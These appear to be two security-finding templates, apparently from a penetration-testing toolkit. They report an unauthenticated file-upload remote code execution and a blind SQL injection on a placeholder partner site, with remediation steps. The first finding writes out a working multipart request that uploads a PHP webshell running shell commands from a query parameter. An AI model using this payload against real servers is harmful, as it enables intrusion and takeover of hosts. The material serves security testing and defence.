info.name: Unauthenticated Remote Code Execution in File Upload Handler
author: pdteam
cptc-toolkit
info.description: The /upload/avatar endpoint accepts arbitrary file extensions and writes uploaded files into a directory served directly by the application server. By uploading a .php file containing a webshell and requesting it back, an unauthenticated attacker achieves remote code execution as the application user.
info.remediation: Validate uploaded file content via magic-byte sniffing, not the extension or Content-Type header. Store uploads under a path that is not directly served by the web server. Serve uploads via a controller that sets a forced Content-Disposition: attachment and a narrowed Content-Type. Rotate any secrets reachable from this host.

request:
POST /upload/avatar HTTP/1.1
Host: partners.example.com
Content-Type: multipart/form-data; boundary=---X

-----X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
-----X--

info.name: Blind SQL Injection in Partner Search
author: cptc-toolkit
info.description: The `q` parameter on GET /partners/search is concatenated directly into a SQL LIKE clause without parameterization. Time-based blind injection was confirmed and used to exfiltrate row counts from `customers` and `payment_methods`.
info.remediation: Rewrite all data-access paths to use parameterized queries (prepared statements or the ORM's bound-parameter API). Add a detection rule for time-based payloads at the WAF tier.

response:
HTTP/1.1 200 OK
Content-Length: 14
[delay: 5018 ms vs baseline 78 ms]
extracted-results: TIME_DELTA=5018ms vs 78ms baseline → confirmed blind SQLi
